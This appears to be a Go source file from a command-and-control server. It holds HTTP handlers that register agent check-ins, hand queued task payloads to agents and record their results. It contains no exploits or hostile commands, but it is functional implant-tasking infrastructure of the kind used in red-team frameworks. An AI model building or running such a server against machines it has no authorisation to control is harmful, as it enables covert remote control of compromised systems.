package c2server

import (
	"encoding/json"
	"io"
	"net/http"

	"github.com/sirupsen/logrus"
)

type Handlers struct {
	agents *AgentRegistry
	tasks  *TaskQueue
}

func NewHandlers(agents *AgentRegistry, tasks *TaskQueue) *Handlers {
	return &Handlers{agents: agents, tasks: tasks}
}

func (h *Handlers) HandleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" {
		http.Error(w, "missing agent_id", http.StatusBadRequest)
		return
	}

	h.agents.Checkin(req)

	resp := CheckinResponse{
		SleepInterval: int(DefaultBeaconInterval.Seconds()),
		TasksPending:  h.tasks.HasPending(req.AgentID),
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

func (h *Handlers) HandleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req TaskRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" {
		http.Error(w, "missing agent_id", http.StatusBadRequest)
		return
	}

	if _, ok := h.agents.Get(req.AgentID); !ok {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	task := h.tasks.Dequeue(req.AgentID)
	if task == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNoContent)
		return
	}

	logrus.Debugf("dispatching task %s (%s) to agent %s", task.ID, task.Type, req.AgentID)

	resp := TaskResponse{
		TaskID:  task.ID,
		Type:    task.Type,
		Payload: task.Payload,
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

func (h *Handlers) HandleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req ResultRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" || req.TaskID == "" {
		http.Error(w, "missing agent_id or task_id", http.StatusBadRequest)
		return
	}

	if _, ok := h.agents.Get(req.AgentID); !ok {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	h.tasks.Complete(req.TaskID, req.Output, req.Error)
	logrus.Infof("task %s completed by agent %s (status: %s)", req.TaskID, req.AgentID, req.Status)

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ResultResponse{Ack: true})
}
